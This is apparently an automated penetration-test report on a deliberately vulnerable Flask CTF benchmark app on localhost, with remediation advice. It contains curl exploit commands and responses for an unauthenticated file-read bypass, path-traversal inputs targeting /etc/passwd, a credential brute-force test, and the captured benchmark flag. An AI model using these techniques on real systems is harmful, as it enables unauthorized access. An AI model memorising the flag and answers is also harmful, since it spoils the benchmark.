# Security Assessment Report

## Executive Summary

- **Target:** http://localhost:34549
- **Assessment Date:** March 9, 2026
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

This security assessment evaluated a minimal Flask web application with only 3 HTTP endpoints and approximately 27 lines of Python code. The application demonstrates severe security deficiencies, representing a complete absence of security architecture beyond basic containerization. The assessment successfully identified and exploited multiple critical vulnerabilities that enable complete compromise of the application.

### Summary by Vulnerability Type

**Authentication Vulnerabilities:**

Three critical authentication vulnerabilities were successfully exploited:
- **Complete Authentication Bypass (AUTH-VULN-01):** The application presents a login form but has zero backend authentication logic. All protected resources, including the CTF flag, are accessible without any credentials. **Impact: Critical** - Anonymous attackers can access all resources without providing credentials. CTF flag successfully captured.
- **Missing Rate Limiting (AUTH-VULN-03):** Zero rate limiting mechanisms at both application and web server layers. Testing confirmed 50+ rapid login attempts without throttling or blocking. **Impact: High** - Enables unlimited high-speed brute force and credential stuffing attacks.
- **Session Management Completely Absent (AUTH-VULN-04):** No SECRET_KEY configured, no session cookies created, no mechanism to maintain authentication state. **Impact: Critical** - Application cannot maintain authenticated state across requests.

One additional authentication vulnerability was identified but requires internal network access to exploit:
- **Credential Transmission Over HTTP (AUTH-VULN-02):** Application runs HTTP-only with no TLS/HTTPS. **Blocker:** Exploitation requires Man-in-the-Middle positioning requiring network-level access beyond the scope of web application testing.

**Authorization Vulnerabilities:**

One critical authorization vulnerability was successfully exploited:
- **Anonymous File Access Bypass (AUTHZ-VULN-01):** Anonymous users can access arbitrary files in the static directory by manipulating the `filename` query parameter via the `/resource` endpoint. **Impact: Critical** - Complete unauthorized access to sensitive files. Apache's FilesMatch protection bypassed via Flask WSGI application layer. CTF flag successfully captured: `FLAG{fe4218ba92808c79600e0d2a9ffd9ae324a4cda320d6a59bc59f79f817bb5f58}`

**Cross-Site Scripting (XSS) Vulnerabilities:**

No XSS vulnerabilities were found. The application uses Flask's Jinja2 template engine with automatic HTML escaping, contains only static templates with no dynamic user input rendering, and has no unsafe JavaScript manipulation of the DOM.

**SQL/Command Injection Vulnerabilities:**

One critical path traversal/injection vulnerability was successfully exploited:
- **Path Traversal via /resource Endpoint (INJ-VULN-01):** The `/resource` endpoint accepts an unsanitized `filename` parameter passed directly to Flask's `send_from_directory()` without authentication or authorization. **Impact: Critical (CVSS 7.5)** - Complete unauthorized access to CTF flag and all static directory files. Successfully extracted flag value via simple HTTP GET request bypassing Apache's FilesMatch directive.

No SQL injection vulnerabilities exist (no database layer). No command injection vulnerabilities exist (no system command execution).

**Server-Side Request Forgery (SSRF) Vulnerabilities:**

No SSRF vulnerabilities were found. The application makes no outbound HTTP requests, has no URL-based file inclusion, performs no external API calls, and has no webhook or callback functionality. The application is completely self-contained with no outbound network communication capability.

## Network Reconnaissance

**Open Ports and Exposed Services:**
- **Port 22/tcp:** SSH (OpenSSH 9.9) exposed - While out of scope for web application testing, SSH exposure should be reviewed for necessity and hardening requirements
- **Primary Attack Surface:** HTTP service on port 34549 (mapped to internal port 80)

**Security Configuration Findings:**
- **HTTP-Only Deployment:** Application runs exclusively on HTTP (port 80) with no HTTPS/TLS configuration
- **Missing Security Headers:** No Strict-Transport-Security (HSTS), no Content-Security-Policy (CSP), no X-Frame-Options, no X-Content-Type-Options headers detected
- **CORS Misconfiguration:** Wildcard `Access-Control-Allow-Origin: *` header configured in Apache (webapp-httpd.conf:9), allowing unrestricted cross-origin access
- **Directory Indexing:** Enabled in Apache configuration, potentially exposing directory structure

**Infrastructure Observations:**
- **Web Server:** Apache HTTP Server 2.4.66 (Debian) with mod_wsgi-py3
- **Containerization:** Docker deployment running on Debian Bullseye base image
- **Privilege Context:** Container running as root user (no USER directive in Dockerfile to drop privileges)
- **No Web Application Firewall (WAF):** No protective layer detected in front of the application

**Attack Surface Summary:**
- 3 network-accessible HTTP endpoints (/, /login, /resource)
- Zero endpoints require authentication
- Zero endpoints perform input validation
- Critical vulnerability: `/resource` endpoint with path traversal enabling arbitrary file access within static directory

---

# Injection Exploitation Evidence

## Successfully Exploited Vulnerabilities

### INJ-VULN-01: Path Traversal / Unauthorized File Access in /resource Endpoint

**Summary:**
- **Vulnerable location:** `GET /resource?filename=<USER_INPUT>` endpoint (routes.py:16-19)
- **Overview:** The `/resource` endpoint accepts an unsanitized `filename` parameter and passes it directly to Flask's `send_from_directory()` function without authentication or authorization checks. This allows anonymous attackers to bypass Apache's FilesMatch directive and access arbitrary files within the static directory, including the sensitive CTF flag.
- **Impact:** Complete unauthorized access to CTF flag and all static directory files. Successfully extracted flag value: `FLAG{fe4218ba92808c79600e0d2a9ffd9ae324a4cda320d6a59bc59f79f817bb5f58}`
- **Severity:** CRITICAL (CVSS 7.5 - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Prerequisites:** None - Vulnerability is exploitable by anonymous attackers from public internet with zero authentication requirements.

**Exploitation Steps:**

1. **Verify target availability:**
   ```bash
   curl -s "http://localhost:34549/" -o /dev/null -w "%{http_code}\n"
   # Expected: 302 (redirect to /login)
   ```

2. **Confirm Apache blocks direct flag access (validates bypass mechanism):**
   ```bash
   curl -i "http://localhost:34549/static/flag"
   ```
   **Expected Response:**
   ```
   HTTP/1.1 403 Forbidden
   Server: Apache/2.4.66 (Debian)
   Content-Type: text/html; charset=iso-8859-1

   <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
   <html><head>
   <title>403 Forbidden</title>
   </head><body>
   <h1>Forbidden</h1>
   <p>You don't have permission to access this resource.</p>
   </body></html>
   ```
   **Analysis:** Apache's FilesMatch directive (webapp-httpd.conf:24-27) successfully blocks direct access to the flag file at `/static/flag`. This confirms the security control exists at the web server level.

3. **Bypass Apache protection using Flask application endpoint to extract CTF flag:**
   ```bash
   curl -i "http://localhost:34549/resource?filename=flag"
   ```
   **Actual Response:**
   ```
   HTTP/1.1 200 OK
   Date: Mon, 09 Mar 2026 23:58:35 GMT
   Server: Apache/2.4.66 (Debian)
   Content-Length: 70
   Last-Modified: Mon, 09 Mar 2026 23:14:44 GMT
   Content-Disposition: inline; filename=flag
   Cache-Control: no-cache
   ETag: "1773098084.0-70-3105360811"
   Content-Type: application/octet-stream

   FLAG{fe4218ba92808c79600e0d2a9ffd9ae324a4cda320d6a59bc59f79f817bb5f58}
   ```
   **Analysis:** The Flask `/resource` endpoint successfully serves the flag file, bypassing Apache's file-level access controls. The application-level file serving via `send_from_directory()` circumvents web server protections because it serves files programmatically rather than through Apache's static file handling.

**Proof of Impact:**

**CTF Flag Successfully Extracted:**
```
FLAG{fe4218ba92808c79600e0d2a9ffd9ae324a4cda320d6a59bc59f79f817bb5f58}
```

**Complete Exploitation Proof:**
- **Attack Vector:** Path Traversal / Insecure Direct Object Reference (IDOR)
- **CWE Classification:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory), CWE-639 (Authorization Bypass Through User-Controlled Key)
- **Authentication Required:** None (completely unauthenticated exploit)
- **Attack Complexity:** Low (single HTTP GET request)
- **User Interaction:** None
- **Privilege Level:** Anonymous/unauthenticated user
- **Impact Scope:** Confidentiality breach - unauthorized access to sensitive CTF flag

**Technical Analysis:**

**Vulnerability Root Cause:**
1. **No Authentication:** The `/resource` endpoint (routes.py:16-19) has no authentication decorator or login requirement
2. **No Authorization:** No access control checks before serving files - any filename can be requested
3. **No Input Validation:** The `filename` parameter receives zero validation, sanitization, or allowlisting
4. **Defense-in-Depth Failure:** Application logic bypasses web server security controls

**Data Flow Path:**
```
User Input → Flask Request Object → Unsanitized Parameter → File System Operation
    ↓              ↓                       ↓                        ↓
GET param    request.args.get()      filename variable    send_from_directory()
```

**Code Context:**
```python
# File: /app/website/app/routes.py:16-19
@app.route('/resource')
def resource():
    filename = request.args.get('filename')  # No validation
    return send_from_directory('static', filename)  # No auth check
```

**Flask Built-In Protections (Partial):**
- Flask's `send_from_directory()` uses `werkzeug.security.safe_join()` to prevent directory escape attacks
- Directory traversal attempts blocked: `../../../etc/passwd` → 404 Not Found
- URL-encoded traversal blocked: `..%2F..%2Fetc%2Fpasswd` → 404 Not Found
- Absolute paths blocked: `/etc/passwd` → 404 Not Found
- **However:** Flask CANNOT prevent access to legitimate files within the specified directory when no authorization exists

**Apache vs. Flask Security Boundary:**
- **Apache Layer:** FilesMatch directive blocks direct static file access to flag (`/static/flag` → 403)
- **Application Layer:** Flask endpoint serves same file programmatically (`/resource?filename=flag` → 200)
- **Bypass Mechanism:** Application code has separate execution path that circumvents web server restrictions

**Alternative Exploitation Techniques Tested:**

Path normalization variants (all successful):
```bash
# Direct filename
curl "http://localhost:34549/resource?filename=flag"  # ✅ Works

# Relative path with normalization
curl "http://localhost:34549/resource?filename=./flag"  # ✅ Works (Flask normalizes)
curl "http://localhost:34549/resource?filename=css/../flag"  # ✅ Works (Flask normalizes)
curl "http://localhost:34549/resource?filename=js/../flag"  # ✅ Works (Flask normalizes)
```

Directory escape attempts (all blocked by Flask as expected):
```bash
curl "http://localhost:34549/resource?filename=../routes.py"  # ❌ 404 (escape blocked)
curl "http://localhost:34549/resource?filename=../../run.py"  # ❌ 404 (escape blocked)
curl "http://localhost:34549/resource?filename=..%2f..%2frun.py"  # ❌ 404 (encoded escape blocked)
```

**Notes:**

**Remediation Recommendations:**
1. **Implement Authentication:** Add `@login_required` decorator or equivalent to `/resource` endpoint
2. **Implement Authorization:** Validate user permissions before serving files
3. **Input Validation:** Implement strict allowlist of permitted filenames (e.g., only CSS/JS assets)
4. **File Extension Allowlist:** Reject requests for files without `.css`, `.js`, `.png`, etc. extensions
5. **Remove Sensitive Files:** Flag file should not be stored in web-accessible static directory
6. **Defense-in-Depth:** Application-level controls required; web server restrictions alone are insufficient
7. **Audit Logging:** Log all file access attempts to detect enumeration attacks

**Vulnerability Classification:**
- **Primary:** Insecure Direct Object Reference (IDOR) - lack of authorization on object access
- **Secondary:** Path Traversal (within allowed directory) - unrestricted file enumeration
- **Tertiary:** Information Disclosure - sensitive data exposure

**Business Impact:**
- In CTF context: Complete challenge compromise - flag extracted
- In production context: Would expose all static assets to unauthorized parties, potential exposure of source maps, configuration files, or other sensitive data mistakenly placed in static directory

**Exploitability Assessment:**
- **Skill Level Required:** Novice (basic HTTP knowledge)
- **Tools Required:** curl, web browser, or any HTTP client
- **Time to Exploit:** <30 seconds from target discovery
- **Reliability:** 100% (no race conditions, no timing dependencies)
- **Stealth:** High (appears as legitimate static file request in logs)

---

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-01: Complete Authentication Bypass - Direct Access to Protected Resources

**Summary:**
- **Vulnerable location:** All endpoints (/, /login, /resource) - Authentication system completely non-functional
- **Overview:** The application presents a login form but has zero backend authentication logic. The POST /login endpoint accepts credentials but immediately redirects back to /login without any validation. All protected resources, including the CTF flag, are accessible without any authentication.
- **Impact:** Complete compromise of application security - anonymous attackers can access all resources, including sensitive CTF flag data, without providing any credentials
- **Severity:** Critical

**Prerequisites:** None - exploit works from completely unauthenticated state

**Exploitation Steps:**

1. **Access protected resource directly without any authentication:**
```bash
curl http://localhost:34549/resource?filename=flag
```

**Expected Result:** Application should require authentication
**Actual Result:** Flag returned directly without any authentication check

2. **Verify login endpoint does not process credentials:**
```bash
curl -X POST http://localhost:34549/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=admin"
```

**Expected Result:** Server should validate credentials
**Actual Result:** HTTP 302 redirect to /login without processing credentials (routes.py:11-12 simply executes `return redirect(url_for('login'))`)

3. **Access any endpoint without session or cookies:**
```bash
curl http://localhost:34549/
curl http://localhost:34549/login
curl http://localhost:34549/resource?filename=flag
```

**Expected Result:** Redirect to login or 401 Unauthorized
**Actual Result:** All endpoints return content without authentication

**Proof of Impact:**

**CTF Flag Captured:** `FLAG{fe4218ba92808c79600e0d2a9ffd9ae324a4cda320d6a59bc59f79f817bb5f58}`

**Evidence:**
- Flag accessed via unauthenticated HTTP GET request to `/resource?filename=flag`
- Response HTTP 200 OK with flag content in response body
- No session cookies required
- No authentication headers required
- Flag also downloadable via browser navigation (downloaded to `.playwright-mcp/flag`)

**Technical Root Cause:**
- File: `/app/website/app/routes.py` lines 9-13
- Login handler code:
```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        return redirect(url_for('login'))  # Ignores all credentials!
    return render_template('login.html')
```
- No user database exists (no ORM, no user model)
- No password validation logic exists anywhere in codebase
- No authentication decorators on any endpoints
- Client-side JavaScript in login.html:55 calls `event.preventDefault()`, preventing form submission

**Notes:**
This vulnerability represents a **complete authentication architecture failure**. The application creates the illusion of security with a login form, but provides zero actual protection. This is the most severe authentication vulnerability possible - authentication simply does not exist to bypass.

---

### AUTH-VULN-03: Missing Rate Limiting - Unlimited Brute Force Attacks

**Summary:**
- **Vulnerable location:** POST /login endpoint (and all other endpoints)
- **Overview:** The application has zero rate limiting mechanisms at both the application layer (Flask) and web server layer (Apache). Testing confirmed 50+ rapid login attempts were processed without any throttling, delays, or blocking.
- **Impact:** If authentication were functional, attackers could perform unlimited high-speed credential stuffing, brute force, and password spraying attacks without detection or interference
- **Severity:** High

**Prerequisites:** None - publicly accessible endpoint

**Exploitation Steps:**

1. **Execute automated brute force attack script:**

Created Python script at `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-019-24/app/test_rate_limiting.py` with the following configuration:

```python
# Target: http://localhost:34549/login
# Method: POST with application/x-www-form-urlencoded
# Credentials tested: 10 username:password pairs
# Total attempts: 50 rapid requests (5 iterations per credential pair)
```

Run the exploit:
```bash
cd /app/repos/xbow-validation-benchmarks/benchmarks/XBEN-019-24/app
python3 test_rate_limiting.py > rate_limiting_test_results.txt
```

2. **Analyze results for rate limiting indicators:**
```bash
cat rate_limiting_test_results.txt
```

**Proof of Impact:**

**Brute Force Attack Results:**
- **Total Requests:** 50 rapid authentication attempts
- **Success Rate:** 100% (50/50 requests processed)
- **HTTP 429 Responses:** 0 (no rate limiting detected)
- **Average Response Time:** 1.16 ms
- **Response Time Trend:** -48.4% (responses got FASTER, indicating no progressive delays)
- **Blocked Requests:** 0
- **Timeouts:** 0

**Sample Output from Test:**
```
Attempt #  1 | Creds: admin:admin           | Status: 200   | Time: 9.11ms
Attempt #  2 | Creds: admin:password        | Status: 200   | Time: 0.94ms
Attempt #  3 | Creds: admin:123456          | Status: 200   | Time: 1.04ms
[... 47 more successful attempts ...]
Attempt # 50 | Creds: admin:qwerty          | Status: 200   | Time: 0.70ms

FINAL VERDICT: NO RATE LIMITING DETECTED
```

**Evidence:**
- All 50 requests returned HTTP 200 (or HTTP 302 for POST /login)
- Zero HTTP 429 (Too Many Requests) responses
- No progressive delays (response times actually decreased)
- No account lockout mechanisms triggered
- No CAPTCHA challenges presented
- Full test results available at: `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-019-24/app/rate_limiting_test_results.txt`

**Technical Root Cause:**
- No Flask-Limiter library installed (requirements.txt only contains `flask`)
- No rate limiting decorators on any route handlers
- Apache configuration (`webapp-httpd.conf`) has no mod_ratelimit or mod_evasive configuration
- No per-IP throttling logic in application code
- No failed login attempt tracking

**Notes:**
While authentication is non-functional in this application, the complete absence of rate limiting is still exploitable for:
- Resource exhaustion attacks
- Application fingerprinting via rapid requests
- Timing attack data collection
- If authentication were implemented, unlimited credential attacks would be possible at ~800+ requests/second

---

### AUTH-VULN-04: Session Management Completely Absent

**Summary:**
- **Vulnerable location:** Application-wide - Flask session management not configured
- **Overview:** The application has no session management system. No SECRET_KEY is configured, no session cookies are created, and no mechanism exists to maintain authentication state between requests. The logout endpoint returns HTTP 404 (does not exist).
- **Impact:** Even if authentication were functional, the application cannot maintain authenticated state across requests, making persistent login impossible
- **Severity:** Critical

**Prerequisites:** None

**Exploitation Steps:**

1. **Verify no session cookies are set after login POST:**
```bash
curl -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -X POST http://localhost:34549/login \
  -d "username=admin&password=admin" -v 2>&1 | grep -E "Set-Cookie"
```

**Expected Result:** Set-Cookie header with session cookie
**Actual Result:** No Set-Cookie headers in response

2. **Check cookie storage:**
```bash
cat /tmp/cookies.txt
```

**Expected Result:** Session cookie stored
**Actual Result:** Empty cookie jar (only HTTP Cookie File header, no cookies)

3. **Verify logout endpoint does not exist:**
```bash
curl -I http://localhost:34549/logout
```

**Expected Result:** HTTP 200 or 302 with session invalidation
**Actual Result:** HTTP 404 NOT FOUND

4. **Access protected resources repeatedly without any session state:**
```bash
for i in {1..5}; do
  curl -s http://localhost:34549/resource?filename=flag
  echo ""
done
```

**Expected Result:** Session required for access
**Actual Result:** Flag returned in all 5 requests without any session cookies or authentication

**Proof of Impact:**

**Session Cookie Evidence:**
- POST request to /login: No `Set-Cookie` headers in HTTP response
- Cookie jar after login: Empty (no session cookies stored)
- Browser DevTools: No cookies set for localhost:34549 domain
- HTTP response headers analysis: No session-related cookies (no `session=`, `sessionid=`, `auth_token=`, etc.)

**Session Configuration Evidence:**
- Flask app initialization (`/app/website/app/__init__.py` lines 1-7): No `app.config['SECRET_KEY']` configured
- No session cookie security flags configured (SESSION_COOKIE_HTTPONLY, SESSION_COOKIE_SECURE, SESSION_COOKIE_SAMESITE)
- No Flask session usage in any route handlers (no `session[...]` assignments or reads)

**Logout Endpoint:**
- GET /logout: HTTP 404 NOT FOUND (route does not exist)
- No logout functionality in application code

**Repeated Access Without Sessions:**
```
Request 1: FLAG{fe4218ba92808c79600e0d2a9ffd9ae324a4cda320d6a59bc59f79f817bb5f58}
Request 2: FLAG{fe4218ba92808c79600e0d2a9ffd9ae324a4cda320d6a59bc59f79f817bb5f58}
Request 3: FLAG{fe4218ba92808c79600e0d2a9ffd9ae324a4cda320d6a59bc59f79f817bb5f58}
Request 4: FLAG{fe4218ba92808c79600e0d2a9ffd9ae324a4cda320d6a59bc59f79f817bb5f58}
Request 5: FLAG{fe4218ba92808c79600e0d2a9ffd9ae324a4cda320d6a59bc59f79f817bb5f58}
```

All requests successful without any session state, proving the application cannot track authentication.

**Technical Root Cause:**
- File: `/app/website/app/__init__.py`
- Missing configuration:
```python
# MISSING: app.config['SECRET_KEY'] = 'secure-random-key'
# MISSING: app.config['SESSION_COOKIE_HTTPONLY'] = True
# MISSING: app.config['SESSION_COOKIE_SECURE'] = True
# MISSING: app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
```
- No session storage backend (no Redis, no database, no server-side session store)
- No logout route defined in routes.py

**Notes:**
This vulnerability is architectural - the application fundamentally cannot maintain authentication state. Combined with AUTH-VULN-01 (no authentication), this creates a doubly-broken authentication system: there's no login validation AND no way to remember who's logged in.

---

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: Anonymous File Access Bypass - CTF Flag Exposure

**Summary:**
- **Vulnerable location:** `GET /resource` endpoint (routes.py:16-19)
- **Overview:** Anonymous users can access arbitrary files in the static directory by manipulating the `filename` query parameter, completely bypassing authentication and authorization controls. Successfully exploited to capture the CTF flag.
- **Impact:** Complete unauthorized access to sensitive files including the CTF flag. Apache's FilesMatch protection directive is bypassed via the Flask WSGI application layer.
- **Severity:** Critical

**Prerequisites:** None required - endpoint is publicly accessible

**Exploitation Steps:**

1. **Identify the vulnerable endpoint**
   - The `/resource` endpoint accepts a `filename` query parameter without any authentication or authorization checks
   - Location: `http://localhost:34549/resource`
   - Code reference: `/app/website/app/routes.py` lines 16-19

2. **Execute the exploit to capture the CTF flag**
   ```bash
   curl -i 'http://localhost:34549/resource?filename=flag'
   ```

3. **Observe successful unauthorized access**
   - Response: HTTP 200 OK
   - Content-Type: application/octet-stream
   - Flag content returned in response body

**Proof of Impact:**

**FLAG CAPTURED (HIGHEST PRIORITY):**
```
FLAG{fe4218ba92808c79600e0d2a9ffd9ae324a4cda320d6a59bc59f79f817bb5f58}
```

**Complete HTTP Response:**
```
HTTP/1.1 200 OK
Date: Mon, 09 Mar 2026 23:58:34 GMT
Server: Apache/2.4.66 (Debian)
Content-Length: 70
Last-Modified: Mon, 09 Mar 2026 23:14:44 GMT
Content-Disposition: inline; filename=flag
Cache-Control: no-cache
ETag: "1773098084.0-70-3105360811"
Content-Type: application/octet-stream

FLAG{fe4218ba92808c79600e0d2a9ffd9ae324a4cda320d6a59bc59f79f817bb5f58}
```

**Additional Evidence:**

1. **Horizontal Authorization Bypass Confirmed:**
   - No authentication required (no cookies, no session tokens, no credentials)
   - No authorization checks performed on requested resource
   - Any anonymous user can access any file in the static directory

2. **Apache Protection Bypass:**
   - Apache configuration attempts to block direct access via FilesMatch directive (webapp-httpd.conf:24-27)
   - Flask WSGI application bypasses this protection by serving files through Python code
   - Request flow: Client → Apache → mod_wsgi → Flask → send_from_directory() → File access

3. **Other files accessible via same vulnerability:**
   ```bash
   curl -s 'http://localhost:34549/resource?filename=css/bootstrap.min.css' | head -c 100
   ```
   Response: Bootstrap CSS content (confirms endpoint serves multiple files)

4. **Flask path traversal protection verified (vulnerability scoped to static directory):**
   ```bash
   curl -i 'http://localhost:34549/resource?filename=../routes.py'
   ```
   Response: HTTP 404 NOT FOUND (Flask blocks traversal outside static directory)

**Root Cause Analysis:**

The vulnerability exists due to three compounding failures:

1. **Missing Authentication** (routes.py:16)
   - No `@login_required` decorator on endpoint
   - No authentication middleware
   - Endpoint is completely public

2. **Missing Authorization** (routes.py:17-19)
   - No ownership validation on requested file
   - No check that user has permission to access resource
   - No allowlist of permitted filenames

3. **Inadequate Input Validation** (routes.py:18)
   - Filename parameter taken directly from user input without sanitization
   - No allowlist enforcement
   - Relies solely on Flask's send_from_directory() for security

**Vulnerable Code:**
```python
# File: /app/website/app/routes.py:16-19
@app.route('/resource')  # No authentication decorator
def resource():
    filename = request.args.get('filename')  # No validation
    return send_from_directory('static', filename)  # No authorization check
```

**Notes:**

This vulnerability represents a **complete failure in authorization architecture**. The application has:
- Zero authentication mechanisms (login endpoint is non-functional)
- Zero authorization controls on any endpoint
- Zero session management (no SECRET_KEY configured)
- Zero input validation on user-controlled parameters

The exploitation required no advanced techniques - a simple HTTP GET request with a query parameter was sufficient to capture the CTF flag. This is the definition of a critical authorization bypass vulnerability with maximum impact and minimal exploit complexity.

**Business Impact:**
- **Confidentiality:** Complete breach - sensitive CTF flag exposed to anonymous users
- **Integrity:** Not directly impacted (endpoint is read-only)
- **Availability:** Not directly impacted
- **Compliance:** Violates fundamental security principles - no access control on sensitive resources

**Remediation Recommendations:**
1. Implement proper authentication mechanism
2. Add authorization checks before file access
3. Use allowlist for permitted filenames
4. Remove flag file from static directory
5. Implement session management with secure SECRET_KEY
6. Add comprehensive security logging
7. Implement rate limiting to prevent enumeration attacks
